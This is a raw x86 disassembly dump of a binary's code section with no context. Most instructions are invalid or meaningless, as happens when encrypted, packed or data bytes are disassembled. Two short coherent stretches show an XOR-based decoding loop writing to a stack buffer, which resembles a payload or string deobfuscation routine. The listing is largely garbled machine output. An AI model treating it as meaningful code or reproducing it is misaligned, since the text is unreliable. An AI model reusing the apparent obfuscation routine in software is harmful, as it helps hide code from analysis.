  403a04:	(bad)  
  403a05:	mov    ds:0xbbbe6350,al
  403a0a:	add    cl,al
  403a0c:	(bad)  
  403a0e:	in     eax,dx
  403a0f:	lods   eax,DWORD PTR ds:[esi]
  403a10:	call   0xfb37:0x587c37be
  403a17:	sti    
  403a18:	sub    BYTE PTR [edx],0x86
  403a1b:	std    
  403a1c:	mov    edx,esp
  403a1e:	pop    esi
  403a1f:	inc    ebx
  403a20:	imul   eax,DWORD PTR [esi],0x4d6ff01d
  403a26:	in     eax,0xbb
  403a28:	push   esp
  403a29:	or     edx,DWORD PTR [edi-0x3f65518f]
  403a2f:	cs in  al,0x97
  403a32:	inc    ebp
  403a33:	(bad)  [ebp-0x34]
  403a36:	(bad)  
  403a37:	adc    esi,DWORD PTR [esi]
  403a39:	push   edx
  403a3a:	mov    ebp,0xa007afc9
  403a3f:	bound  esp,QWORD PTR [esi]
  403a41:	sbb    eax,0x26744db0
  403a46:	(bad)  
  403a47:	jnp    0x403aa9
  403a49:	mov    edx,0xf35da8ff
  403a4e:	enter  0x779f,0x1b
  403a52:	out    dx,al
  403a53:	dec    edx
  403a54:	hlt    
  403a55:	adc    ah,BYTE PTR [edi+0x14]
  403a58:	cmp    DWORD PTR [eax+edi*4],ecx
  403a5b:	mov    ds:0x2b92c05e,al
  403a60:	(bad)  
  403a61:	push   0x882df2e9
  403a66:	mov    esp,0xe30f2212
  403a6b:	mov    bh,0xeb
  403a6d:	(bad)  
  403a6e:	out    0xbd,eax
  403a70:	jo     0x403aba
  403a72:	(bad)
  403a75:	or     ah,ah
  403a77:	retf   
  403a78:	mov    bl,BYTE PTR [ebx+ebp*8+0x1a1242c8]
  403a7f:	xor    al,0x6f
  403a81:	inc    esi
  403a82:	pop    es
  403a83:	cmp    DWORD PTR [ebx],0x807085b
  403a89:	sti    
  403a8a:	push   esi
  403a8b:	mov    edi,0x7b08dcb
  403a90:	test   DWORD PTR [eax-0x1b0e33aa],0xf15dde64
  403a9a:	jecxz  0x403a5a
  403a9c:	xor    eax,DWORD PTR [eax]
  403a9e:	or     WORD PTR [edi+0x30a982e3],0xff97
  403aa6:	shl    DWORD PTR [ebx+eax*1+0x14eef9b1],cl
  403aad:	nop
  403aae:	or     BYTE PTR [ebx+0x6a3d8a4d],0xcf
  403ab5:	mov    ecx,0x6ee5707
  403aba:	cdq    
  403abb:	sbb    BYTE PTR [ecx-0x33dd9803],cl
  403ac1:	xlat   BYTE PTR ds:[ebx]
  403ac2:	int3   
  403ac3:	arpl   WORD PTR [ebp-0x540e84a4],dx
  403ac9:	dec    ecx
  403aca:	sahf   
  403acb:	in     eax,dx
  403acc:	int    0x28
  403ace:	mov    eax,0x51817bf6
  403ad3:	fmul   st,st(5)
  403ad5:	push   esp
  403ad6:	pop    edi
  403ad7:	(bad)  
  403ad8:	mov    dl,0x7a
  403ada:	adc    al,0xa0
  403adc:	xchg   edx,eax
  403add:	test   BYTE PTR [edi+0x492e6925],dh
  403ae3:	rol    al,cl
  403ae5:	push   fs
  403ae7:	and    eax,0xd94bed59
  403aec:	add    DWORD PTR [ecx+0x8],0x41
  403af0:	(bad)  
  403af1:	leave  
  403af2:	xor    esi,0xffffff96
  403af5:	xchg   ebx,eax
  403af6:	ficom  DWORD PTR [ebp-0x38]
  403af9:	retf   
  403afa:	inc    ebx
  403afb:	test   edx,ebp
  403afd:	(bad)  
  403afe:	fsub   DWORD PTR [edx]
  403b00:	in     eax,dx
  403b01:	add    BYTE PTR [edx],dl
  403b03:	push   edi
  403b04:	jo     0x403afb
  403b06:	xchg   ecx,eax
  403b07:	or     eax,ebx
  403b09:	dec    eax
  403b0a:	inc    edx
  403b0b:	and    BYTE PTR [edi+0x5ae1c5a7],bh
  403b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b12:	mov    ebp,DWORD PTR [edx*8+0x1148e3cd]
  403b19:	cmp    DWORD PTR [ebx],edx
  403b1b:	pop    edx
  403b1c:	lods   al,BYTE PTR ds:[esi]
  403b1d:	dec    edi
  403b1e:	cmp    DWORD PTR [ecx-0xe],edx
  403b21:	repz mov ah,0xfd
  403b24:	imul   dx,WORD PTR [edx+0x34],0xff8a
  403b29:	jae    0x403b2c
  403b2b:	add    cl,ah
  403b2d:	cld    
  403b2e:	sahf   
  403b2f:	push   ds
  403b30:	cmp    eax,0x8a0386a3
  403b35:	(bad)  
  403b37:	pop    ds
  403b38:	cs pushf 
  403b3a:	jae    0x403ad3
  403b3c:	add    al,0x8f
  403b3e:	and    bl,bl
  403b40:	adc    al,0xd4
  403b42:	sbb    dh,dl
  403b44:	sbb    ch,BYTE PTR [eax+ebp*8]
  403b47:	mov    DWORD PTR es:[esi-0x31a6f934],edx
  403b4e:	inc    esi
  403b4f:	jb     0x403af4
  403b51:	xchg   edi,eax
  403b52:	mov    ebp,0x95dd000d
  403b57:	xchg   esp,eax
  403b58:	mov    bh,0x22
  403b5a:	add    esp,DWORD PTR [ecx+0x4047baab]
  403b60:	mov    WORD PTR [edx+0x5b8b96ca],0xbf42
  403b69:	aaa    
  403b6a:	xor    al,0x26
  403b6c:	mov    ch,0xda
  403b6e:	xor    DWORD PTR [edx-0x1626f7d4],0xa06baf24
  403b78:	mov    BYTE PTR [ecx],dl
  403b7a:	outs   dx,DWORD PTR ds:[esi]
  403b7b:	mov    esi,eax
  403b7d:	mov    ebx,0xbcf5ce05
  403b82:	sub    al,BYTE PTR [edi]
  403b84:	mov    cl,0x1b
  403b86:	out    dx,al
  403b87:	inc    edi
  403b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b89:	(bad)  
  403b8a:	js     0x403ba8
  403b8c:	loopne 0x403c07
  403b8e:	cmp    BYTE PTR [edi],al
  403b90:	add    eax,0xda6cd46f
  403b95:	dec    esi
  403b96:	mov    esi,0xa680ea1b
  403b9b:	mov    DWORD PTR [edi+esi*8],ebp
  403b9e:	fnstenv [ebx]
  403ba0:	adc    al,0xa6
  403ba2:	dec    ebx
  403ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba4:	(bad)  
  403ba5:	lock sbb eax,ebp
  403ba8:	jo     0x403b7f
  403baa:	loopne 0x403bde
  403bac:	js     0x403b6b
  403bae:	fstp   QWORD PTR [esp+ebx*4]
  403bb1:	aas    
  403bb2:	ss inc ebp
  403bb4:	jbe    0x403b6a
  403bb6:	or     BYTE PTR [eax-0xe08eabf],0x7d
  403bbd:	ret    0xa0bc
  403bc0:	lahf   
  403bc1:	pop    ebp
  403bc2:	(bad)  [ecx-0x3ef87027]
  403bc8:	out    dx,eax
  403bc9:	retf   0x2010
  403bcc:	mov    DWORD PTR [ecx-0x5f0edcb0],ebx
  403bd2:	and    ah,BYTE PTR [edx+0x7a06f43a]
  403bd8:	mov    ecx,0xb50cb347
  403bdd:	imul   ebx,DWORD PTR [edx],0xffffffb7
  403be0:	cmp    BYTE PTR ds:0xb71b0ac0,dh
  403be6:	fld    DWORD PTR [ecx+0x2235a2d0]
  403bec:	add    DWORD PTR [esi-0x7b7c164c],edx
  403bf2:	aad    0x84
  403bf4:	pop    ebx
  403bf5:	xchg   DWORD PTR [edi+0x63],esi
  403bf8:	sbb    ebp,DWORD PTR [edx]
  403bfa:	jns    0x403bd0
  403bfc:	mov    ebx,0x1b52f033
  403c01:	mov    ah,0x27
  403c03:	popa   
  403c04:	imul   ecx,DWORD PTR [esi-0x63a10dd2],0xf2e449ea
  403c0e:	mov    esi,0x179e2f41
  403c13:	(bad)  
  403c14:	mov    dl,0x9a
  403c16:	xchg   ecx,eax
  403c17:	inc    esp
  403c18:	xlat   BYTE PTR ds:[ebx]
  403c19:	mov    edi,0x469e6539
  403c1e:	mov    BYTE PTR [ebx-0xb],dh
  403c21:	in     al,0xa1
  403c23:	push   0x23f12984
  403c28:	dec    ecx
  403c29:	dec    esi
  403c2a:	push   ds
  403c2b:	leave  
  403c2c:	push   0x40a87b98
  403c31:	jl     0x403c13
  403c33:	test   BYTE PTR [ebx-0x72d9f5f3],ah
  403c39:	sbb    DWORD PTR [ebp-0x27],ebp
  403c3c:	dec    ecx
  403c3d:	mov    ch,0xe7
  403c3f:	jnp    0x403c41
  403c41:	ret    0x2a33
  403c44:	stos   DWORD PTR es:[edi],eax
  403c45:	jnp    0x403c41
  403c47:	sub    cl,BYTE PTR [eax]
  403c49:	in     eax,dx
  403c4a:	loop   0x403bfd
  403c4c:	pushf  
  403c4d:	lahf   
  403c4e:	jb     0x403c1c
  403c50:	pop    edi
  403c51:	jno    0x403c10
  403c53:	es int3 
  403c55:	adc    al,0xa0
  403c57:	adc    DWORD PTR [ebx-0x56a8351f],edx
  403c5d:	pushf  
  403c5e:	push   cs
  403c5f:	pushf  
  403c60:	xlat   BYTE PTR ds:[ebx]
  403c61:	mov    esp,DWORD PTR [esi+0x9]
  403c64:	shl    DWORD PTR [ebx],1
  403c66:	stos   BYTE PTR es:[edi],al
  403c67:	sahf   
  403c68:	mov    WORD PTR [edx-0x57],es
  403c6b:	xchg   ebx,eax
  403c6c:	jmp    0x403bf2
  403c6e:	mov    dh,0xc3
  403c70:	sbb    al,0x4f
  403c72:	mov    edx,0x2ead89a8
  403c77:	loopne 0x403ca1
  403c79:	fiadd  DWORD PTR [edi]
  403c7b:	into   
  403c7c:	add    ecx,DWORD PTR [esi+0x34]
  403c7f:	inc    ebx
  403c80:	jmp    0x403c6e
  403c82:	je     0x403c19
  403c84:	inc    eax
  403c85:	push   DWORD PTR [eax+ebp*4+0x2d9ca846]
  403c8c:	lods   al,BYTE PTR ds:[esi]
  403c8d:	ja     0x403c6a
  403c8f:	lods   eax,DWORD PTR ds:[esi]
  403c90:	or     al,bl
  403c92:	fstp   st(4)
  403c94:	xor    DWORD PTR [ecx],ebx
  403c96:	popa   
  403c97:	scas   al,BYTE PTR es:[edi]
  403c98:	jge    0x403cd1
  403c9a:	pop    ecx
  403c9b:	int    0xbc
  403c9d:	es je  0x403ce7
  403ca0:	dec    edi
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x3d43fcc7
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cd3
  403cf7:	xchg   edi,eax
  403cf8:	xor    dl,dh
  403cfa:	ror    bl,1
  403cfc:	xor    esp,DWORD PTR [eax-0x2ff4830d]
  403d02:	fcmovb st,st(7)
  403d04:	daa    
  403d05:	dec    ebp
  403d06:	not    bl
  403d08:	cmp    dh,BYTE PTR [eax-0x3]
  403d0b:	xor    BYTE PTR [ebx],dh
  403d0d:	xor    al,0xa4
  403d0f:	inc    ebx
  403d10:	cld    
  403d11:	pop    eax
  403d12:	mov    cl,0x6c
  403d14:	pop    esp
  403d15:	jg     0x403cbe
  403d17:	stos   BYTE PTR es:[edi],al
  403d18:	popf   
  403d19:	lods   al,BYTE PTR ds:[esi]
  403d1a:	retf   0xdbeb
  403d1d:	fmulp  st(0),st
  403d1f:	adc    BYTE PTR [edi],bl
  403d21:	repnz push esp
  403d23:	mov    ds:0x83bafb6a,al
  403d28:	(bad)  
  403d29:	iret   
  403d2a:	push   ss
  403d2b:	aas    
  403d2c:	scas   al,BYTE PTR es:[edi]
  403d2d:	bound  esi,QWORD PTR [edx+ebp*4+0x7c]
  403d31:	sti    
  403d32:	add    eax,DWORD PTR ds:0x543c9679
  403d38:	pushf  
  403d39:	mov    BYTE PTR [ecx+0x24],bh
  403d3c:	push   ds
  403d3d:	push   cs
  403d3e:	shl    DWORD PTR [edx+esi*1],0xf8
  403d42:	daa    
  403d43:	js     0x403dbe
  403d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d46:	jmp    0x4852:0xd0209aa4
  403d4d:	stc    
  403d4e:	mov    al,BYTE PTR [eax+0x78]
  403d51:	push   edx
  403d52:	sub    BYTE PTR [edx+0x3f],bl
  403d55:	fs xchg esi,eax
  403d57:	or     BYTE PTR [esi],al
  403d59:	adc    dl,BYTE PTR [ecx+0x31623d82]
  403d5f:	jge    0x403cfb
  403d61:	mov    eax,0xaf28afd8
  403d66:	push   eax
  403d67:	push   0x1c
  403d69:	test   eax,0xbcbb9b4d
  403d6e:	or     eax,esi
  403d70:	dec    ebx
  403d71:	imul   ebx,ebx,0x2f
  403d74:	jmp    0x403d29
  403d76:	push   ecx
  403d77:	dec    ebp
  403d78:	lock or al,0x84
  403d7b:	fimul  WORD PTR [edx+ebx*1-0xc]
  403d7f:	xchg   ecx,eax
  403d80:	dec    eax
  403d81:	dec    esp
  403d82:	mov    ah,BYTE PTR [ecx+edi*4]
  403d85:	sub    eax,0x80e48d7f
  403d8a:	sub    BYTE PTR [ecx-0x73d1fcea],al
  403d90:	ds (bad) 
  403d93:	test   ebp,ebx
  403d95:	mov    dl,0x9d
  403d97:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d99:	mov    ebx,0x8a7ccc0
  403d9e:	outs   dx,BYTE PTR ds:[esi]
  403d9f:	cwde   
  403da0:	sub    al,0x45
  403da2:	int3   
  403da3:	iret   
  403da4:	test   DWORD PTR [ebx-0x4408c489],ecx
  403daa:	cwde   
  403dab:	cmp    al,0x14
  403dad:	xchg   ecx,eax
  403dae:	pop    edx
  403daf:	jnp    0x403d3b
  403db1:	fsub   st(4),st
  403db3:	dec    ebx
  403db4:	push   edx
  403db5:	ins    BYTE PTR es:[edi],dx
  403db6:	xchg   edx,eax
  403db7:	jns    0x403db2
  403db9:	cli    
  403dba:	vcmppd xmm5,xmm6,XMMWORD PTR [edi],0x57
  403dbf:	fistp  QWORD PTR [edx+0x3b6ffa7c]
  403dc5:	into   
  403dc6:	ret    
  403dc7:	adc    BYTE PTR [ebx+0x33],dl
  403dca:	in     al,0xb
  403dcc:	and    BYTE PTR [edi+0x7c],bl
  403dcf:	inc    eax
  403dd0:	xchg   ebx,eax
  403dd1:	jne    0x403dea
  403dd3:	lock cs nop
  403dd6:	stos   BYTE PTR es:[edi],al
  403dd7:	add    ebx,DWORD PTR [esp+ecx*2]
  403dda:	cmp    DWORD PTR [eax],edx
  403ddc:	stos   BYTE PTR es:[edi],al
  403ddd:	push   ebp
  403dde:	int    0xc9
  403de0:	inc    eax
  403de1:	je     0x403e21
  403de3:	mov    esp,0x31276e19
  403de8:	repz jbe 0x403d84
  403deb:	pop    ds
  403dec:	in     eax,dx
  403ded:	push   ss
  403dee:	lea    ebp,[ebx]
  403df0:	push   esi
  403df1:	jmp    0xa3392ef6
  403df6:	js     0x403da7
  403df8:	sbb    ecx,eax
  403dfa:	dec    eax
  403dfb:	enter  0x2772,0x3d
  403dff:	xchg   ebx,eax
  403e00:	adc    cl,BYTE PTR [eax-0xdb7b3bb]
  403e06:	sbb    al,0xfc
  403e08:	or     ebx,DWORD PTR [edx+eiz*8]
  403e0b:	lods   eax,DWORD PTR ds:[esi]
  403e0c:	sbb    DWORD PTR [esi-0xc2306e9],ebp
  403e12:	(bad)  
  403e13:	cli    
  403e14:	mov    edi,0xb8deae3a
  403e19:	dec    ebp
  403e1a:	cmp    DWORD PTR [ecx],esi
  403e1c:	ss jge 0x403e9c
  403e1f:	jmp    0x403e64
  403e21:	test   eax,0x23e69f48
  403e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e27:	and    al,0x10
  403e29:	xchg   esp,eax
  403e2a:	jno    0x403e51
  403e2c:	sub    DWORD PTR [ebp-0x3b40604a],esp
  403e32:	test   eax,0x359f1ad2
  403e37:	xlat   BYTE PTR ds:[ebx]
  403e38:	sbb    esp,esi
  403e3a:	out    0xfe,al
  403e3c:	xor    DWORD PTR [eax],eax
  403e3e:	stos   DWORD PTR es:[edi],eax
  403e3f:	dec    ebx
  403e40:	fmul   st(2),st
  403e42:	or     eax,0x434370b3
  403e47:	fcmovbe st,st(0)
  403e49:	xor    eax,0xb6946a28
  403e4e:	test   BYTE PTR [eax-0x26f7954c],bl
  403e54:	stos   DWORD PTR es:[edi],eax
  403e55:	(bad)  
  403e56:	jne    0x403e2c
  403e58:	jp     0x403eb1
  403e5a:	mov    eax,0x8abd422f
  403e5f:	mov    bl,0xf4
  403e61:	mov    al,ds:0x7fcb99a6
  403e66:	fsub   DWORD PTR [ecx+0xdd2ffb6]
  403e6c:	mov    BYTE PTR [ebx],0xf3
  403e6f:	pop    es
  403e70:	mov    ds:0x13c3aacc,eax
  403e75:	lahf   
  403e76:	pop    edi
  403e77:	mov    bh,BYTE PTR [esi]
  403e79:	cmp    ecx,edx
  403e7b:	jg     0x403e34
  403e7d:	mov    al,ds:0x18dc81c4
  403e82:	mov    DWORD PTR [esi-0x42],esp
  403e85:	adc    edx,ebp
  403e87:	lock cmp cl,dl
  403e8a:	sbb    ecx,ebp
  403e8c:	pop    es
  403e8d:	jl     0x403ea9
  403e8f:	pusha  
  403e90:	mov    DWORD PTR [edi],ebp
  403e92:	lods   al,BYTE PTR ds:[esi]
  403e93:	add    ch,bh
  403e95:	or     al,0xec
  403e97:	out    dx,eax
  403e98:	sti    
  403e99:	adc    dh,dh
  403e9b:	fsubr  DWORD PTR [eax-0x2a]
  403e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e9f:	(bad)  
  403ea0:	fbld   TBYTE PTR [ecx-0x3f]
  403ea3:	ins    DWORD PTR es:[edi],dx
  403ea4:	xor    cl,BYTE PTR [esi]
  403ea6:	xor    eax,0xcc848cf
  403eab:	aad    0xe0
  403ead:	push   esi
  403eae:	jmp    0x403e8d
  403eb0:	mov    dh,0xae
  403eb2:	jle    0x403f22
  403eb4:	iret   
  403eb5:	(bad)  
  403eb6:	test   al,0x21
  403eb8:	sahf   
  403eb9:	and    DWORD PTR [ebx+0x44],esi
  403ebc:	adc    eax,DWORD PTR [ecx+0x52]
  403ebf:	or     bh,BYTE PTR [ebx]
  403ec1:	push   ebp
  403ec2:	jo     0x403f03
  403ec4:	fs clc 
  403ec6:	(bad)  
  403ec7:	mov    ah,0xbe
  403ec9:	adc    esi,edx
  403ecb:	push   cs
  403ecc:	dec    ebp
  403ecd:	stc    
  403ece:	leave  
  403ecf:	xor    BYTE PTR [eax+0x6],dl
  403ed2:	add    ah,ah
  403ed4:	js     0x403e56
  403ed6:	push   0x0
  403ed8:	adc    ebp,DWORD PTR gs:[esi-0x36078aa3]
  403edf:	xor    eax,0x99c7d1e8
  403ee4:	stos   DWORD PTR es:[edi],eax
  403ee5:	in     eax,0x96
  403ee7:	mov    bl,BYTE PTR [ecx-0x52]
  403eea:	fnsave [esi-0x64da54c9]
  403ef0:	(bad)  
  403ef1:	in     al,0x46
  403ef3:	retf   
  403ef4:	adc    al,0x83
  403ef6:	mov    ebx,0x4425f4a9
  403efb:	mov    esp,0x674766d7
  403f00:	das    
  403f01:	sub    BYTE PTR [ebx],ch
  403f03:	data16 adc BYTE PTR [eax-0x33],cl
  403f07:	call   0x752b472
  403f0c:	xchg   edx,eax
  403f0d:	pop    es
  403f0e:	push   edx
  403f0f:	adc    edi,esi
  403f11:	out    dx,eax
  403f12:	and    eax,DWORD PTR [ebx+edi*8]
  403f15:	pop    ebx
  403f16:	sti    
  403f17:	repnz xor al,0xd7
  403f1a:	xchg   ebx,eax
  403f1b:	in     eax,dx
  403f1c:	pop    esp
  403f1d:	cld    
  403f1e:	(bad)  
  403f20:	sahf   
  403f21:	mov    DWORD PTR [edi+0x133f5bc6],esp
  403f27:	mov    dl,0x96
  403f29:	out    dx,eax
  403f2a:	out    dx,eax
  403f2b:	popa   
  403f2c:	pop    ss
  403f2d:	mov    al,0xd5
  403f2f:	loope  0x403f1d
  403f31:	js     0x403f4a
  403f33:	(bad)  
  403f34:	jp     0x403f4a
  403f36:	out    0x78,eax
  403f38:	fisub  DWORD PTR [ecx-0x3d]
  403f3b:	xchg   ebx,eax
  403f3c:	inc    ecx
  403f3d:	sbb    edi,DWORD PTR [ebp+0x3dc74a31]
  403f43:	dec    ecx
  403f44:	push   eax
  403f45:	xchg   ebx,eax
  403f46:	or     al,0x45
  403f48:	jno    0x403f4b
  403f4a:	push   esi
  403f4b:	outs   dx,BYTE PTR ds:[esi]
  403f4c:	clc    
  403f4d:	ror    edx,1
  403f4f:	inc    ecx
  403f50:	fld    QWORD PTR fs:[edi+ebx*2]
  403f54:	inc    esp
  403f55:	sub    al,0xf4
  403f57:	xor    eax,0x61116c89
  403f5c:	cmp    eax,0x50f14f8
  403f61:	stos   DWORD PTR es:[edi],eax
  403f62:	test   cl,cl
  403f64:	or     dh,dh
  403f66:	and    BYTE PTR [edi],0x71
  403f69:	adc    BYTE PTR [ecx-0x2c],bl
  403f6c:	shl    BYTE PTR [edi],1
  403f6e:	shl    BYTE PTR [edi-0x3c877a6f],cl
  403f74:	push   edx
  403f75:	adc    eax,0x722b6c86
  403f7a:	xchg   ecx,eax
  403f7b:	push   es
  403f7c:	pop    ss
  403f7d:	push   cs
  403f7e:	and    BYTE PTR [ecx+0x41],0x57
  403f82:	cmp    al,0xf1
  403f84:	arpl   WORD PTR [ebx+0x4a744ec],cx
  403f8a:	(bad)  [ecx+0x1e7b87b7]
  403f90:	sbb    ah,BYTE PTR [ebp-0x1a]
  403f93:	sbb    eax,0x6348e13d
  403f98:	sbb    ebx,ebx
  403f9a:	jle    0x403fa6
  403f9c:	push   esp
  403f9d:	or     edx,DWORD PTR [ecx-0x1d]
  403fa0:	stos   BYTE PTR es:[edi],al
  403fa1:	hlt    
  403fa2:	fdiv   QWORD PTR [eax-0x53]
  403fa5:	loop   0x403f8c
  403fa7:	pop    ds
  403fa8:	xor    BYTE PTR [ebp+0x2a532f26],ah
  403fae:	test   DWORD PTR ds:0x706d577,ebp
  403fb4:	sub    DWORD PTR [ebx+ebx*1-0x2b],edi
  403fb8:	test   eax,0xb5ee5559
  403fbd:	sahf   
  403fbe:	cmp    al,0x91
  403fc0:	mov    al,ds:0x154c0df1
  403fc5:	sahf   
  403fc6:	sbb    edi,ecx
  403fc8:	mov    al,ds:0x11cd9a4d
  403fcd:	ja     0x403fc4
  403fcf:	jmp    0x4d1111dc
  403fd4:	sub    eax,0xee52f658
  403fd9:	xor    eax,0x6c6b989
  403fde:	push   0x6d
  403fe0:	fild   DWORD PTR [ecx-0x45a192bb]
  403fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe7:	push   0xffffffcc
  403fe9:	dec    esp
  403fea:	push   edx
  403feb:	and    ebp,esi
  403fed:	cmp    DWORD PTR [edx-0x55],ecx
  403ff0:	and    DWORD PTR [esi-0x1d19bcc7],ecx
  403ff6:	mov    edx,DWORD PTR [edi]
  403ff8:	push   es
  403ff9:	cmp    al,BYTE PTR [ecx]
  403ffb:	(bad)  
  403ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ffe:	in     eax,dx
  403fff:	mov    al,0x4b
  404001:	mov    edx,0x753e01fa
  404006:	mov    al,ds:0xd00f4453
  40400b:	jmp    0xb0b16c3a
  404010:	out    0xcf,eax
  404012:	inc    ebx
  404013:	inc    ecx
  404014:	pop    esp
  404015:	add    eax,DWORD PTR [edx]
  404017:	pop    ebp
  404018:	jmp    0x2ba29187
  40401d:	and    BYTE PTR [ebp+0x7256bb0a],dl
  404023:	jmp    0x14b38608
  404028:	jge    0x404062
  40402a:	mov    ds:0xb909fbea,al
  40402f:	and    eax,0xdde19c6a
  404034:	jmp    0x3451fcac
  404039:	push   cs
  40403a:	repz sahf 
  40403c:	adc    ebx,DWORD PTR [ebx+0x22]
  40403f:	loopne 0x40406c
  404041:	pusha  
  404042:	sbb    eax,0x5798cc86
  404047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404048:	loop   0x404044
  40404a:	jp     0x404095
  40404c:	or     BYTE PTR [edi],ah
  40404e:	sbb    bh,dh
  404050:	popf   
  404051:	dec    ebx
  404052:	mov    edi,DWORD PTR ds:0x8d16b665
  404058:	fcom   DWORD PTR [esi]
  40405a:	dec    esi
  40405b:	push   ebp
  40405c:	in     eax,dx
  40405d:	push   esp
  40405e:	pop    es
  40405f:	sub    DWORD PTR [ebx],eax
  404061:	aad    0xa3
  404063:	jl     0x404096
  404065:	sub    ch,BYTE PTR [ecx+0x1830457b]
  40406b:	ins    BYTE PTR es:[edi],dx
  40406c:	add    BYTE PTR [esi+0x1c5adf34],cl
  404072:	push   ebx
  404073:	xchg   ecx,eax
  404074:	pushf  
  404075:	scas   eax,DWORD PTR es:[edi]
  404076:	cmc    
  404077:	lea    eax,[eax+ebp*8-0x5fd82709]
  40407e:	cmp    BYTE PTR [eax-0x4afff6ba],bl
  404084:	shl    ebp,cl
  404086:	sbb    DWORD PTR ds:0x68842f22,edx
  40408c:	inc    esi
  40408d:	mov    ebx,0xcc195b52
  404092:	sub    al,0xd2
  404094:	cmp    eax,0x5f141667
  404099:	xchg   esi,eax
  40409a:	les    eax,FWORD PTR [esi+eiz*1]
  40409d:	xchg   esi,eax
  40409e:	mov    ebp,0x8ced987b
  4040a3:	(bad)  
  4040a4:	or     DWORD PTR [esp+edi*1],esp
  4040a7:	xchg   ebx,eax
  4040a8:	lea    esp,[esi+0x1b]
  4040ab:	stos   BYTE PTR es:[edi],al
  4040ac:	imul   ecx,DWORD PTR [ebx-0x6a096778],0xdef57621
  4040b6:	(bad)  
  4040b7:	rcl    bh,cl
  4040b9:	outs   dx,BYTE PTR ds:[esi]
  4040ba:	rcl    BYTE PTR [ecx+edx*8+0x3e61738e],0x64
  4040c2:	and    eax,0x46443c3b
  4040c7:	int3   
  4040c8:	lock lahf 
  4040ca:	js     0x404082
  4040cc:	test   DWORD PTR [esi+0x33f8458b],edx
  4040d2:	rol    DWORD PTR [ebx],0xc6
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x5874abcd],ah
  4040ef:	icebp  
  4040f0:	xchg   ebx,eax
  4040f1:	sbb    edi,DWORD PTR [esi+0x7e]
  4040f4:	push   esi
  4040f5:	jns    0x404175
  4040f7:	jle    0x40416d
  4040f9:	bound  edx,QWORD PTR ds:0xce621010
  4040ff:	icebp  
  404100:	loop   0x40412d
  404102:	mul    DWORD PTR [ecx+0xfc5a19c]
  404108:	push   esp
  404109:	mov    esp,0xdfd1e96a
  40410e:	ss pop edx
  404110:	mov    eax,0x358196f4
  404115:	inc    ebp
  404116:	pop    eax
  404117:	jns    0x404185
  404119:	pop    ecx
  40411a:	push   esp
  40411b:	adc    ch,dl
  40411d:	dec    esi
  40411e:	call   0x5723e2ff
  404123:	in     eax,0x66
  404125:	lahf   
  404126:	jns    0x40419e
  404128:	sub    edi,DWORD PTR [ecx]
  40412a:	mov    esp,0x6757e7c8
  40412f:	push   ebx
  404130:	sti    
  404131:	popa   
  404132:	mov    al,ds:0x683e23f8
  404137:	fwait
  404138:	jg     0x404153
  40413a:	out    dx,al
  40413b:	test   al,0xa9
  40413d:	sub    eax,0xd0ba44b8
  404142:	mov    ebx,0x3695a456
  404147:	mov    bh,0x56
  404149:	dec    edx
  40414a:	push   esp
  40414b:	adc    al,0x7e
  40414d:	mov    ds:0x178f54c3,al
  404152:	xchg   ebp,eax
  404153:	sub    al,0xc5
  404156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404157:	cmp    eax,0xe628275
  40415c:	mov    ebx,0x937aa3ef
  404161:	in     al,dx
  404162:	cwde   
  404163:	adc    DWORD PTR [esi],esi
  404165:	push   ds
  404166:	(bad)  
  404167:	in     al,dx
  404168:	or     edx,DWORD PTR [ebp-0x30]
  40416b:	add    al,0xe1
  40416d:	ins    DWORD PTR es:[edi],dx
  40416e:	cmp    BYTE PTR [ebp+0x7d90b509],bl
  404174:	es dec eax
  404176:	aaa    
  404177:	jmp    0x15a13590
  40417c:	fstp   DWORD PTR [esp+edi*2+0x25d559f7]
  404183:	cld    
  404184:	mov    bh,0xb3
  404186:	jae    0x404188
  404188:	push   0x77be819c
  40418d:	repz push esi
  40418f:	sub    dh,ah
  404191:	sbb    dh,dl
  404193:	out    dx,al
  404194:	dec    ecx
  404195:	sub    eax,0x94a630de
  40419a:	mov    bh,0x30
  40419c:	fucomp st(0)
  40419e:	add    al,0xec
  4041a0:	ficom  DWORD PTR ds:0x97384fec
  4041a6:	imul   ch
  4041a8:	in     al,0x12
  4041aa:	in     al,0xa1
  4041ac:	add    eax,0x1efdc3f9
  4041b1:	out    dx,al
  4041b2:	mov    dl,0x1d
  4041b4:	mov    ds:0xb3176c5d,al
